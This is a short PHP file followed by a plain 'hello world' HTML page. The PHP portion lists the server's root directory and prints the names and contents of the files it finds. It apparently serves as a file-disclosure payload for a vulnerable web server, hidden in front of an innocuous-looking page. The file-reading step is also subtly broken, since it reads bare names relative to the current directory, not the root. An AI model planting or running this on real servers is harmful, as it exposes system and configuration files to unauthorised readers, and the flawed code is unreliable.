<?php
$files = scandir('/');
$f = array();
foreach($files as $file){
    echo $file."\n";
    echo " \n";
    array_push($f, file_get_contents($file));
}

foreach($f as $of){
    echo $of;
    echo " \t\n";
}

?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    hello world
</body>
</html>